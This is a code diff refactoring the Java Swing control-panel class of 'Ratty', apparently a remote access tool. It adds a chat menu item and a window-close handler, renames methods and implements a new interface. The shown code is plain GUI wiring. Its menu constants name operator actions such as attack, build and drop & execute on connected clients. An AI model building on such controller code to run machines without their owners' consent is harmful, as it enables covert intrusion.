@@ -9,6 +9,8 @@ import java.awt.Point;
 import java.awt.event.ActionEvent;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
+import java.awt.event.WindowAdapter;
+import java.awt.event.WindowEvent;
 import java.awt.image.BufferedImage;
 import java.io.File;
 import java.util.Arrays;
@@ -39,24 +41,21 @@ import de.sogomn.engine.util.AbstractListenerContainer;
 import de.sogomn.engine.util.ImageUtils;
 import de.sogomn.rat.Ratty;
 
-final class RattyGui extends AbstractListenerContainer<IGuiController> {
+public final class RattyGui extends AbstractListenerContainer<IGuiController> implements IRattyGui {
 	
 	private JFrame frame;
 	
 	private JTable table;
 	private ServerClientTableModel tableModel;
 	private JScrollPane scrollPane;
-	
 	private JPopupMenu menu;
 	private JMenuBar menuBar;
 	private JButton build, attack;
-	
 	private JFileChooser fileChooser;
+	private ServerClient clientClicked;
 	
-	private ServerClient lastServerClientClicked;
-	
-	private static final Dimension SIZE = new Dimension(1150, 600);
 	private static final String TITLE = "Ratty " + Ratty.VERSION;
+	private static final Dimension SIZE = new Dimension(1150, 600);
 	
 	private static final BufferedImage GUI_ICON_SMALL = ImageUtils.loadImage("/gui_icon.png");
 	private static final BufferedImage GUI_ICON_MEDIUM = ImageUtils.scaleImage(GUI_ICON_SMALL, 64, 64);
@@ -91,6 +90,8 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 	public static final String BUILD = LANGUAGE.getString("action.build");
 	public static final String ATTACK = LANGUAGE.getString("action.attack");
 	public static final String DROP_EXECUTE = LANGUAGE.getString("action.drop_execute");
+	public static final String CHAT = LANGUAGE.getString("action.chat");
+	public static final String CLOSE = "Close";
 	
 	public static final List<BufferedImage> GUI_ICONS = Arrays.asList(GUI_ICON_SMALL, GUI_ICON_MEDIUM, GUI_ICON_LARGE);
 	
@@ -106,7 +107,8 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		UTILITY_ITEM_DATA.put(COMMAND, MENU_ICONS[5]);
 		UTILITY_ITEM_DATA.put(WEBSITE, MENU_ICONS[8]);
 		UTILITY_ITEM_DATA.put(AUDIO, MENU_ICONS[7]);
-		OTHER_ITEM_DATA.put(FREE, MENU_ICONS[10]);
+		UTILITY_ITEM_DATA.put(CHAT, MENU_ICONS[12]);
+		OTHER_ITEM_DATA.put(FREE, MENU_ICONS[11]);
 	}
 	
 	public RattyGui() {
@@ -127,7 +129,7 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 				final Point mousePoint = m.getPoint();
 				final int rowIndex = table.rowAtPoint(mousePoint);
 				
-				lastServerClientClicked = tableModel.getServerClient(rowIndex);
+				clientClicked = tableModel.getServerClient(rowIndex);
 				
 				table.setRowSelectionInterval(rowIndex, rowIndex);
 			}
@@ -139,6 +141,12 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		final JMenu utility = createMenu(UTILITY, UTILITY_ICON, UTILITY_ITEM_DATA);
 		final JMenu other = createMenu(OTHER, OTHER_ICON, OTHER_ITEM_DATA);
 		final JTableHeader tableHeader = table.getTableHeader();
+		final WindowAdapter closingAdapter = new WindowAdapter() {
+			@Override
+			public void windowClosing(final WindowEvent w) {
+				close();
+			}
+		};
 		
 		tableHeader.setReorderingAllowed(false);
 		
@@ -164,7 +172,8 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		contentPane.add(scrollPane, BorderLayout.CENTER);
 		contentPane.add(menuBar, BorderLayout.SOUTH);
 		
-		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+		frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
+		frame.addWindowListener(closingAdapter);
 		frame.setPreferredSize(SIZE);
 		frame.pack();
 		frame.setLocationRelativeTo(null);
@@ -204,9 +213,17 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 	private void actionPerformed(final ActionEvent a) {
 		final String command = a.getActionCommand();
 		
-		notifyListeners(controller -> controller.userInput(command, lastServerClientClicked));
+		notifyListeners(controller -> controller.userInput(command, clientClicked));
 	}
 	
+	public void close() {
+		frame.setVisible(false);
+		frame.dispose();
+		
+		notifyListeners(controller -> controller.userInput(CLOSE, clientClicked));
+	}
+	
+	@Override
 	public void update() {
 		final int selectedRow = table.getSelectedRow();
 		
@@ -217,15 +234,19 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		}
 	}
 	
-	public void addRow(final ServerClient client) {
+	@Override
+	public void addClient(final ServerClient client) {
 		tableModel.addServerClient(client);
 	}
 	
-	public void removeRow(final ServerClient client) {
+	@Override
+	public void removeClient(final ServerClient client) {
 		tableModel.removeServerClient(client);
 	}
 	
-	public boolean showWarning(final String message, final String... options) {
+	@Override
+	public boolean showWarning(final String message, final String yes, final String no) {
+		final String[] options = {yes, no};
 		final int input = JOptionPane.showOptionDialog(frame, message, null, JOptionPane.YES_NO_OPTION, JOptionPane.WARNING_MESSAGE, null, options, null);
 		
 		if (input == JOptionPane.YES_OPTION) {
@@ -235,10 +256,12 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		return false;
 	}
 	
+	@Override
 	public void showError(final String message) {
 		JOptionPane.showMessageDialog(frame, message, null, JOptionPane.ERROR_MESSAGE, null);
 	}
 	
+	@Override
 	public void showMessage(final String message) {
 		final JOptionPane pane = new JOptionPane(message, JOptionPane.INFORMATION_MESSAGE);
 		final JDialog dialog = pane.createDialog(frame, null);
@@ -247,12 +270,15 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		dialog.setVisible(true);
 	}
 	
-	public int showOptionDialog(final String message, final String... options) {
+	@Override
+	public int showOptions(final String message, final String yes, final String no, final String cancel) {
+		final String[] options = {yes, no, cancel};
 		final int input = JOptionPane.showOptionDialog(frame, message, null, JOptionPane.YES_NO_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
 		
 		return input;
 	}
 	
+	@Override
 	public File getFile(final String type) {
 		final FileFilter filter;
 		
@@ -275,10 +301,12 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		return null;
 	}
 	
+	@Override
 	public File getFile() {
 		return getFile(null);
 	}
 	
+	@Override
 	public File getSaveFile() {
 		final int input = fileChooser.showSaveDialog(frame);
 		
@@ -291,6 +319,7 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		return null;
 	}
 	
+	@Override
 	public File getSaveFile(final String type) {
 		File file = getSaveFile();
 		
@@ -308,12 +337,14 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		return file;
 	}
 	
+	@Override
 	public String getInput(final String message) {
 		final String input = JOptionPane.showInputDialog(frame, message);
 		
 		return input;
 	}
 	
+	@Override
 	public String getInput() {
 		return getInput(null);
 	}
